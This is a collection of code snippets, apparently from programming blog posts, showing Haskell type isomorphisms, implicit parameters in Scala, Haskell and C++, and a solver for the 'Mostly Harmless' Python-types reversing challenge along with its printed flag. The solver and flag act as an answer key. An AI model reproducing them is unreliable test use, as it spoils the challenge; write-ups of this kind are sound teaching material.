<span class="token hvariable">toRHS</span> <span class="token punctuation">(</span><span class="token constant">Left</span> <span class="token hvariable">x</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">True</span><span class="token punctuation">,</span> <span class="token hvariable">x</span><span class="token punctuation">)</span>
<span class="token hvariable">toRHS</span> <span class="token punctuation">(</span><span class="token constant">Right</span> <span class="token hvariable">x</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">False</span><span class="token punctuation">,</span> <span class="token hvariable">x</span><span class="token punctuation">)</span>

<span class="token hvariable">toLHS</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token constant">Bool</span><span class="token punctuation">,</span> <span class="token hvariable">a</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token constant">Either</span> <span class="token hvariable">a</span> <span class="token hvariable">a</span>
<span class="token hvariable">toLHS</span> <span class="token punctuation">(</span><span class="token constant">True</span><span class="token punctuation">,</span> <span class="token hvariable">x</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">Left</span> <span class="token hvariable">x</span>
<span class="token hvariable">toLHS</span> <span class="token punctuation">(</span><span class="token constant">False</span><span class="token punctuation">,</span> <span class="token hvariable">x</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">Right</span> <span class="token hvariable">x</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">toRHS</span> <span class="token operator">::</span> <span class="token constant">Either</span> <span class="token constant">Void</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token hvariable">a</span>
<span class="token hvariable">toRHS</span> <span class="token punctuation">(</span><span class="token constant">Right</span> <span class="token hvariable">x</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token hvariable">x</span>
<span class="token comment">-- toRHS (Left x) = undefined -- Implicit.</span>

<span class="token hvariable">toLHS</span> <span class="token operator">::</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token constant">Either</span> <span class="token constant">Void</span> <span class="token hvariable">a</span>
<span class="token hvariable">toLHS</span> <span class="token hvariable">x</span> <span class="token operator">=</span> <span class="token constant">Right</span> <span class="token hvariable">x</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">toRHS</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token hvariable">a</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token hvariable">a</span>
<span class="token hvariable">toRHS</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token hvariable">x</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token hvariable">x</span>

<span class="token hvariable">toLHS</span> <span class="token operator">::</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token hvariable">a</span><span class="token punctuation">)</span>
<span class="token hvariable">toLHS</span> <span class="token hvariable">x</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token hvariable">x</span><span class="token punctuation">)</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token keyword">data</span> <span class="token constant">Bool</span> <span class="token operator">=</span> <span class="token constant">False</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token constant">True</span> <span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token comment">// Example of using implicit.</span>
<span class="token keyword">def</span> func<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">implicit</span> s<span class="token operator">:</span> <span class="token builtin">String</span><span class="token punctuation">)</span> <span class="token operator">=</span>
  println<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token id function">s</span><span class="token string">"string: </span><span class="token interpolation"><span class="token punctuation">$</span><span class="token expression">s</span></span><span class="token string">;  int: </span><span class="token interpolation"><span class="token punctuation">$</span><span class="token expression">x</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment">// Helper function to run a bunch of SQL statements and return the dataframe results.</span>
<span class="token keyword">def</span> runBatch<span class="token punctuation">(</span>sqls<span class="token operator">:</span> Seq<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">implicit</span> spark<span class="token operator">:</span> SparkSession<span class="token punctuation">)</span><span class="token operator">:</span> Dataframe <span class="token operator">=</span>
  sqls map spark<span class="token punctuation">.</span>sql

<span class="token keyword">def</span> main <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token keyword">implicit</span> <span class="token keyword">val</span> str<span class="token operator">:</span> <span class="token builtin">String</span> <span class="token operator">=</span> <span class="token string">"abc"</span> <span class="token comment">// Mark variable with the implicit keyword.</span>
  <span class="token comment">// implicit val str2: String = "def" // Conflict! Two possible implicits of the same type. Error will occur.</span>

  <span class="token comment">// Notice str is passed implicitly!</span>
  func<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">// string: abc;  int: 1</span>
  func<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span> <span class="token comment">// string: abc;  int: 42</span>
  func<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token comment">// Same as above.</span>
  func<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>

  <span class="token comment">// Create a SparkSession object and mark it as implicit.</span>
  <span class="token keyword">implicit</span> <span class="token keyword">val</span> spark<span class="token operator">:</span> SparkSession <span class="token operator">=</span> SparkSession<span class="token punctuation">.</span>builder<span class="token punctuation">.</span>master<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getOrCreate
  <span class="token keyword">val</span> dfs <span class="token operator">=</span> runBatch<span class="token punctuation">(</span>Seq<span class="token punctuation">(</span>
    <span class="token string">"SELECT 1"</span><span class="token punctuation">,</span>
    <span class="token string">"SELECT 2"</span><span class="token punctuation">,</span>
  <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// `spark` passed implicitly.</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token comment">{-# LANGUAGE ImplicitParams #-}</span> <span class="token comment">-- Enable the implicit parameters language extension.</span>

<span class="token import-statement"><span class="token keyword">import</span> Data<span class="token punctuation">.</span>Function</span> <span class="token punctuation">(</span><span class="token hvariable">on</span><span class="token punctuation">)</span>

<span class="token comment">-- Declare a generic sort function which takes a comparator.</span>
<span class="token hvariable">sortBy</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token constant">Ordering</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">]</span>
<span class="token hvariable">sortBy</span> <span class="token hvariable">_</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token hvariable">sortBy</span> <span class="token hvariable">cmp</span> <span class="token punctuation">(</span><span class="token hvariable">p</span><span class="token operator">:</span><span class="token hvariable">xs</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token comment">-- Quickly hacked quick sort.</span>
    <span class="token hvariable">sortBy</span> <span class="token hvariable">cmp</span> <span class="token punctuation">(</span><span class="token builtin">filter</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">==</span> <span class="token constant">GT</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token hvariable">cmp</span> <span class="token hvariable">p</span><span class="token punctuation">)</span> <span class="token hvariable">xs</span><span class="token punctuation">)</span> 
    <span class="token operator">++</span> <span class="token punctuation">[</span><span class="token hvariable">p</span><span class="token punctuation">]</span> 
    <span class="token operator">++</span> <span class="token hvariable">sortBy</span> <span class="token hvariable">cmp</span> <span class="token punctuation">(</span><span class="token builtin">filter</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">/=</span> <span class="token constant">GT</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token hvariable">cmp</span> <span class="token hvariable">p</span><span class="token punctuation">)</span> <span class="token hvariable">xs</span><span class="token punctuation">)</span> 

<span class="token comment">-- Declare a sort function to sort a list.</span>
<span class="token builtin">sort</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token operator">?</span><span class="token hvariable">cmp</span> <span class="token operator">::</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token constant">Ordering</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">]</span>
<span class="token builtin">sort</span> <span class="token operator">=</span> <span class="token hvariable">sortBy</span> <span class="token operator">?</span><span class="token hvariable">cmp</span>

<span class="token hvariable">main</span> <span class="token operator">::</span> <span class="token constant">IO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token hvariable">main</span> <span class="token operator">=</span> <span class="token keyword">do</span>
    <span class="token keyword">let</span> <span class="token hvariable">xs</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">let</span> <span class="token operator">?</span><span class="token hvariable">cmp</span> <span class="token operator">=</span> <span class="token builtin">compare</span> <span class="token operator">`on`</span> <span class="token builtin">fst</span> <span class="token comment">-- Haskell idiom for constructing comparators.</span>
    
    <span class="token comment">-- All equivalent: [(1,42),(3,14),(5,8),(10,4),(15,92)]</span>
    <span class="token builtin">print</span> <span class="token operator">$</span> <span class="token hvariable">sortBy</span> <span class="token punctuation">(</span><span class="token builtin">compare</span> <span class="token operator">`on`</span> <span class="token builtin">fst</span><span class="token punctuation">)</span> <span class="token hvariable">xs</span>    <span class="token comment">-- Explicit.</span>
    <span class="token builtin">print</span> <span class="token operator">$</span> <span class="token hvariable">sortBy</span> <span class="token operator">?</span><span class="token hvariable">cmp</span> <span class="token hvariable">xs</span>                  <span class="token comment">-- Explicit.</span>
    <span class="token builtin">print</span> <span class="token operator">$</span> <span class="token builtin">sort</span> <span class="token hvariable">xs</span>                         <span class="token comment">-- Implicit.</span>
    
    <span class="token comment">-- Change comparator. [(15,92),(1,42),(3,14),(5,8),(10,4)]</span>
    <span class="token keyword">let</span> <span class="token operator">?</span><span class="token hvariable">cmp</span> <span class="token operator">=</span> <span class="token builtin">compare</span> <span class="token operator">`on`</span> <span class="token punctuation">(</span><span class="token builtin">negate</span> <span class="token operator">.</span> <span class="token builtin">snd</span><span class="token punctuation">)</span>
    <span class="token builtin">print</span> <span class="token operator">$</span> <span class="token hvariable">sortBy</span> <span class="token operator">?</span><span class="token hvariable">cmp</span> <span class="token hvariable">xs</span>                  <span class="token comment">-- Explicit.</span>
    <span class="token builtin">print</span> <span class="token operator">$</span> <span class="token builtin">sort</span> <span class="token hvariable">xs</span>                         <span class="token comment">-- Implicit.</span>
    
    <span class="token keyword">let</span> <span class="token operator">?</span><span class="token hvariable">cmp2</span> <span class="token operator">=</span> <span class="token builtin">compare</span> <span class="token operator">`on`</span> <span class="token builtin">snd</span>
    <span class="token builtin">print</span> <span class="token operator">$</span> <span class="token hvariable">sortBy</span> <span class="token operator">?</span><span class="token hvariable">cmp2</span> <span class="token hvariable">xs</span>
    <span class="token builtin">print</span> <span class="token operator">$</span> <span class="token builtin">sort</span> <span class="token hvariable">xs</span> <span class="token comment">-- Which one is implicitly passed? `cmp` or `cmp2`? :)</span>
    
    <span class="token builtin">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token builtin">sort</span> <span class="token operator">::</span> <span class="token punctuation">(</span><span class="token operator">?</span><span class="token hvariable">cmp</span> <span class="token operator">::</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token hvariable">a</span> <span class="token operator">-&gt;</span> <span class="token constant">Ordering</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">]</span> <span class="token operator">-&gt;</span> <span class="token punctuation">[</span><span class="token hvariable">a</span><span class="token punctuation">]</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span> <span class="token comment">// Bad practice, but just to keep things readable.</span>

<span class="token comment">// Generic sort with comparator.</span>
<span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">F</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span>
T <span class="token function">sortBy</span><span class="token punctuation">(</span>F cmp<span class="token punctuation">,</span> T xs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">sort</span><span class="token punctuation">(</span>xs<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> xs<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> xs<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// Sort with implicit comparator. We name it with an underscore to avoid confusion with std::sort.</span>
<span class="token comment">// Note how `xs` is substituted with the parameter, but `cmp` is "implicitly" used.</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">sort_</span><span class="token expression"><span class="token punctuation">(</span>xs<span class="token punctuation">)</span> <span class="token function">sortBy</span><span class="token punctuation">(</span>cmp<span class="token punctuation">,</span> xs<span class="token punctuation">)</span></span></span>

<span class="token comment">// Helper function.</span>
<span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">const</span> vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&gt;&gt;</span><span class="token operator">&amp;</span> xs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span> <span class="token operator">:</span> xs<span class="token punctuation">)</span>
        cout <span class="token operator">&lt;&lt;</span> <span class="token string">" ("</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">", "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> <span class="token string">")"</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">auto</span> xs <span class="token operator">=</span> vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">{</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    
    <span class="token punctuation">{</span> <span class="token comment">//  (1, 42) (3, 14) (5, 8) (10, 4) (15, 92)</span>
        <span class="token keyword">auto</span> cmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">auto</span> pa<span class="token punctuation">,</span> <span class="token keyword">auto</span> pb<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> pa<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pb<span class="token punctuation">.</span>first<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">sortBy</span><span class="token punctuation">(</span>cmp<span class="token punctuation">,</span> xs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">sort_</span><span class="token punctuation">(</span>xs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Expanded to `print(sortBy(cmp, xs));`.</span>
    <span class="token punctuation">}</span>
     
    <span class="token punctuation">{</span> <span class="token comment">//  (15, 92) (1, 42) (3, 14) (5, 8) (10, 4)</span>
        <span class="token keyword">auto</span> cmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">auto</span> pa<span class="token punctuation">,</span> <span class="token keyword">auto</span> pb<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> pa<span class="token punctuation">.</span>second <span class="token operator">&gt;</span> pb<span class="token punctuation">.</span>second<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">sort_</span><span class="token punctuation">(</span>xs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Same expansion happens here.</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-shell" tabindex="0"><code class="language-shell">mypy output.py</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">L_<span class="token operator">&lt;</span>INPUT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">[</span>N<span class="token punctuation">[</span> L_<span class="token operator">&lt;</span>INPUT<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">[</span>N<span class="token punctuation">[</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Line 378.</span>
<span class="token keyword">class</span> <span class="token class-name">QL_s29</span><span class="token punctuation">(</span>Generic<span class="token punctuation">[</span>T<span class="token punctuation">]</span><span class="token punctuation">,</span> L_n<span class="token punctuation">[</span><span class="token string">"N[QLW_s31[L_x[N[MR[N[T]]]]]]"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token comment">#                                   </span>
<span class="token comment">#                                    Next number</span>
<span class="token comment">#                          Next letter in flag</span>
<span class="token comment">#           Current number</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">import</span> re

<span class="token comment"># Extract the lines containing pointers(?)/relationships between letters.</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.py'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">319</span><span class="token punctuation">:</span><span class="token number">458</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment"># Skip every 2 lines, bc redundant info.</span>

lookup <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token comment"># Parse and store the relationships in a lookup map.</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>
    curr_idx<span class="token punctuation">,</span> char<span class="token punctuation">,</span> next_idx <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'Q._s(\d+)[^ ]+, L_(\w).*.W_s(\d+)'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    lookup<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>curr_idx<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>next_idx<span class="token punctuation">)</span><span class="token punctuation">,</span> char<span class="token punctuation">)</span>

<span class="token comment"># Follow the pointers until we hit 71.</span>
idx <span class="token operator">=</span> <span class="token number">29</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">while</span> idx <span class="token operator">!=</span> <span class="token number">71</span><span class="token punctuation">:</span>
    idx<span class="token punctuation">,</span> c <span class="token operator">=</span> lookup<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
    flag <span class="token operator">+=</span> c

<span class="token comment"># Profit!</span>
<span class="token punctuation">{</span><span class="token operator">%</span> raw <span class="token operator">%</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'maple{{</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">}}'</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">%</span> endraw <span class="token operator">%</span><span class="token punctuation">}</span></code></pre>
<pre data-lang-off="" class="language-txt" tabindex="0"><code class="language-txt">maple{no_type_system_is_safe_from_pl_grads_with_too_much_time_on_their_hands}</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Declare a new class called Challenge.</span>
<span class="token keyword">class</span> <span class="token class-name">Challenge</span><span class="token punctuation">:</span>
    <span class="token comment"># __init__ is a magic method called automatically when an instance is created.</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> title<span class="token punctuation">,</span> description<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Creating challenge </span><span class="token interpolation"><span class="token punctuation">{</span>title<span class="token punctuation">}</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title <span class="token operator">=</span> title
        self<span class="token punctuation">.</span>description <span class="token operator">=</span> description

<span class="token comment"># Create instance of our class.</span>
chal <span class="token operator">=</span> Challenge<span class="token punctuation">(</span><span class="token string">"Mostly Harmless"</span><span class="token punctuation">,</span> <span class="token string">"A totally harmless reverse challenge abusing Python types."</span><span class="token punctuation">)</span>
<span class="token comment"># Prints "Creating challenge Mostly Harmless..."</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># This also declares a class called Challenge.</span>
<span class="token keyword">class</span> <span class="token class-name">Challenge</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span>Challenge<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>Reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Reverse<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span>    <span class="token comment"># A Reverse is a Reverse. (Duh.)</span>
<span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>Reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Challenge<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span>  <span class="token comment"># A Reverse is also a Challenge.</span>
<span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>Challenge<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Reverse<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">False</span> <span class="token comment"># Supertype is not a subtype.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Create a class for Python Reverse challenges.</span>
<span class="token keyword">class</span> <span class="token class-name">PythonReverse</span><span class="token punctuation">(</span>Python<span class="token punctuation">,</span> Reverse<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Challenge</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">class</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span>Challenge<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">class</span> <span class="token class-name">Web</span><span class="token punctuation">(</span>Challenge<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

x<span class="token punctuation">:</span> Challenge <span class="token operator">=</span> Challenge<span class="token punctuation">(</span><span class="token punctuation">)</span>
y<span class="token punctuation">:</span> Challenge <span class="token operator">=</span> Reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
z<span class="token punctuation">:</span> Challenge <span class="token operator">=</span> Web<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span>Challenge<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Challenge</span><span class="token punctuation">:</span>
    title <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    description <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">def</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">class</span> <span class="token class-name">Web</span><span class="token punctuation">:</span>      <span class="token comment"># No inheritance.</span>
    title <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    description <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    url <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
